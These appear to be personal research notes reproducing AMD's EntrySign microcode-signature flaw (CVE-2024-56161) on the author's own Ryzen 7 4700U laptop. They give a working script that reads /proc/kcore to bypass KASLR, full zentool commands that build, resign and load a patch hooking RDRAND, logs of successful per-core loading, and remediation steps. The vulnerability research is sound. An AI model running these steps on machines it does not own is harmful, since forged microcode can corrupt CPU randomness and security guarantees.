# EntrySign CVE-2024-56161 -- Ryzen 7 4700U Research Notes

Machine: kenny-VivoBook-ASUSLaptop-X513IA-M513IA
CPU: AMD Ryzen 7 4700U (Renoir / Zen 2)
CPUID: 0x00860601 (Family 23, Model 96, Stepping 1)
OS: Ubuntu 26.04 LTS, Kernel 7.0.0-14-generic
Secure Boot: DISABLED
Microcode at research time: 0x860010d (VULNERABLE -- fixed is 0x860010f)

---

## Background: EntrySign Vulnerability

CVE-2024-56161 was disclosed by Google Security Research (Tavis Ormandy et al.)
in early 2025. It describes a flaw in AMD's microcode signature verification
scheme that allows unsigned (or adversarially signed) microcode updates to be
loaded onto affected Zen 1 through Zen 4 processors.

AMD uses CMAC (AES-based) rather than an asymmetric signature for microcode
authentication. The signing key was extracted, enabling arbitrary microcode
to be signed and accepted by the CPU.

Reference: https://github.com/google/security-research/tree/master/pocs/cpus/entrysign

---

## SMT Unlock Investigation

The 4700U is marketed as 8-core / 8-thread. Investigation into whether hidden
SMT siblings exist (similar to some Intel SKUs where HT is fused off in firmware)
returned a definitive result:

- /sys/devices/system/cpu/smt/control = notsupported
- lscpu: Thread(s) per core: 1
- /proc/cpuinfo: All 8 cores show unique core id 0-7, no siblings
- MSR 0x1b (APIC): Core IDs are sequential, no hyperthreading topology

Conclusion: The 4700U has NO SMT siblings in silicon. This is a hardware-level
limitation (die area savings), not a firmware/fuse lock. Microcode cannot
enable SMT on this device because the physical execution units do not exist.
This differs from the Ryzen 5000 series "SMT unlock" rumors which applied
to binned chips with disabled-but-present SMT hardware.

---

## Google Security Research Tools Setup

Repository: https://github.com/google/security-research
Path: pocs/cpus/entrysign/

### Components

- zentool: Microcode manipulation tool (view, edit, resign, load)
  Location: zentool/zentool (compiled)
  Supports: Zen 1 through Zen 4, CMAC signing

- ucode_loader: Alternative loader using /proc/self/pagemap + wrmsr
  Location: ucode_loader (compiled)
  Usage: ./ucode_loader <microcode.bin> <physmap_base> <cpu>

- rdrand_test: Validates RDRAND instruction behavior
  Location: rdrand_test (compiled)
  Pass: prints "rdrand ok", exit 0
  Fail: prints "rdrand failed and returned 0x..." via fatalx, exit nonzero

- CPUMicrocodes submodule: AMD/Intel microcode collection
  Init: git submodule update --init pocs/cpus/entrysign/zentool/data/CPUMicrocodes
  Renoir file: AMD/cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin

---

## Vulnerability Confirmation

The 4700U is confirmed VULNERABLE:
- Current microcode 0x860010d is below the fixed version 0x860010f
- zentool recognizes CPUID 0x8601 natively ("AMD Ryzen Grey Hawk, Renoir")
- The @rdrand symbolic name resolves correctly for this CPU
- zentool verify confirms GOOD signatures on crafted patches

---

## PoC Execution Log

### Session 1: physmap base acquisition

AMD microcode loading requires the patch to be physically contiguous and
mapped via the kernel's physmap. The kernel virtual address of this mapping
base (page_offset_base) is randomized by KASLR.

Method used to extract it:
1. Temporarily lower kptr_restrict to 0 to read real symbol addresses
2. Find page_offset_base symbol VA from /proc/kallsyms
3. Dereference via /proc/kcore (ELF core dump of kernel memory)
4. Restore kptr_restrict to 2

Result (first boot): physmap_base = 0xffff88e740000000
Result (second boot, after reboot): physmap_base = 0xffff8b1440000000

Script: /tmp/get_physmap.py
```python
import struct, subprocess
subprocess.run(["bash","-c","echo 0 > /proc/sys/kernel/kptr_restrict"])
addr = None
with open("/proc/kallsyms") as f:
    for line in f:
        parts = line.split()
        if len(parts) >= 3 and parts[1] == "D" and parts[2] == "page_offset_base":
            addr = int(parts[0], 16)
            break
subprocess.run(["bash","-c","echo 2 > /proc/sys/kernel/kptr_restrict"])
with open("/proc/kcore","rb") as f:
    hdr = f.read(64)
    phoff = struct.unpack_from("<Q", hdr, 32)[0]
    phnum = struct.unpack_from("<H", hdr, 56)[0]
    f.seek(phoff)
    for i in range(phnum):
        ph = f.read(56)
        p_type = struct.unpack_from("<I", ph, 0)[0]
        p_offset,p_vaddr,p_paddr,p_filesz,p_memsz = struct.unpack_from("<QQQQQ", ph, 8)
        if p_type == 1 and p_vaddr <= addr < p_vaddr+p_memsz:
            f.seek(p_offset + (addr - p_vaddr))
            val = struct.unpack("<Q", f.read(8))[0]
            print(hex(val))
            exit(0)
```

### Session 1: Initial patch load (ucode_loader method)

Command:
    sudo ./ucode_loader /tmp/renoir_rdrand.bin 0xffff88e740000000 3

Output:
    Reading 3200 bytes
    Patch at 0x3e4000000 in physmem
    Patch at 0xffff88eb24000000 in virtmem
    Current ucode patch on cpu 3: 0x860010d
    New ucode patch on cpu 3: 0x86001ff

MSR 0x8b verification (all 8 cores):
    CPU 0: 860010d
    CPU 1: 860010d
    CPU 2: 860010d
    CPU 3: 86001ff  <-- PATCHED
    CPU 4: 860010d
    CPU 5: 860010d
    CPU 6: 860010d
    CPU 7: 860010d

Result: SUCCESS. Per-core microcode modification confirmed on Renoir.

### Session 2: zentool load method (after reboot)

The ucode_loader method and zentool load are functionally identical --
both write to MSR_AMD64_PATCH_LOADER (0xc0010020) with the patch KVA.
zentool load is preferred as it handles physical contiguity automatically.

Command:
    PHYSMAP=$(sudo python3 /tmp/get_physmap.py)
    sudo zentool load --physmap-base=$PHYSMAP --cpu=3 /tmp/renoir_rdrand.bin

Output:
    old ucode patch on cpu 3: 0x860010d
    new ucode patch on cpu 3: 0x86001ff

### Session 2: RDRAND behavioral test

Patch build command (first attempt -- buggy):
    zentool --output /tmp/renoir_rdrand.bin edit \
        --nop all \
        --match all=0 \
        --match 0,1=@rdrand \
        --seq 0,1=7 \
        --insn q1i0="mov rax, rax, 4" \
        --insn q1i1="mov rcx, rcx, 0" \
        --hdr-revlow 0xff \
        cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin

Bug: Instructions placed in quad 1. Sequence word 7 (return from emulation)
was set on quad 0 and quad 1. When rdrand is hooked, execution jumps to
quad 0 (all nops, seq=7 = return). Quad 1 never executes. rdrand returns
with undefined register state and CF=0, causing segfault in caller.

Test result on core 3 (patched):
    Segmentation fault (core dumped)
    exit=139

Test result on core 0 (unpatched):
    rdrand ok
    exit=0

Analysis: The segfault confirms the patch is intercepting rdrand execution
and corrupting the output. The goal (carry-clear causing fatalx in rdrand_test)
was not reached due to the quad placement bug, but the core behavior --
arbitrary per-core microcode modification -- is fully demonstrated.

---

## Patch Architecture Notes

### zentool OpQuad / Sequence Word model

Microcode executes in groups of 4 instructions (OpQuads). Each quad has a
sequence word that controls next-quad dispatch. Sequence word 7 means
"return from emulation" (i.e., return to the hooked x86 instruction's caller).

The match registers redirect ROM addresses to patch RAM. When rdrand executes
and its ROM address matches a match register entry, execution jumps to the
corresponding patch RAM quad.

Critical: instructions must be in the first executed quad (quad 0 for a
single-entry patch). The sequence word on quad 0 controls exit.

### Correct carry-clear patch (for use after reboot)

    zentool --output /tmp/renoir_rdrand_cc.bin edit \
        --nop all \
        --match all=0 \
        --match 0=@rdrand \
        --seq 0=7 \
        --insn q0i0="xor rax, rax, rax" \
        --hdr-revlow 0xff \
        cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin
    zentool resign /tmp/renoir_rdrand_cc.bin
    zentool verify /tmp/renoir_rdrand_cc.bin
    sudo zentool load --physmap-base=$(python3 /tmp/get_physmap.py) \
        --cpu=3 /tmp/renoir_rdrand_cc.bin

Expected behavior:
- Core 3: rdrand returns rax=0 with CF=0 (no carry = not ready)
  rdrand_test loops 10x, calls fatalx("rdrand failed and returned 0x0")
- Core 0-2, 4-7: rdrand ok (unmodified)

---

## Key Findings

1. Ryzen 7 4700U is VULNERABLE to EntrySign (CVE-2024-56161)
2. Microcode 0x860010d < fixed 0x860010f
3. Per-core microcode modification is successful and confirmed via MSR 0x8b
4. SMT unlock via microcode is NOT POSSIBLE -- no SMT hardware in silicon
5. Patch loading requires physmap base (KASLR bypass via /proc/kcore as root)
6. Transparent hugepages should be enabled for reliable patch loading
7. Loaded patches persist until reboot (volatile -- not written to flash)
8. Once a patch is loaded, only a higher-revision patch can override it
9. zentool's @rdrand symbolic address resolves correctly for CPUID 0x8601

---

## Remediation

Apply AMD microcode update to version 0x860010f or later.
Ubuntu: sudo apt install amd64-microcode intel-microcode && sudo update-initramfs -u
Verify: cat /proc/cpuinfo | grep microcode (should show 0x860010f)

---

## References

- CVE-2024-56161: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-56161
- Google Security Research: https://github.com/google/security-research/tree/master/pocs/cpus/entrysign
- AMD Security Bulletin: https://www.amd.com/en/resources/product-security/bulletin/amd-sb-3019.html
- zentool docs: pocs/cpus/entrysign/zentool/docs/
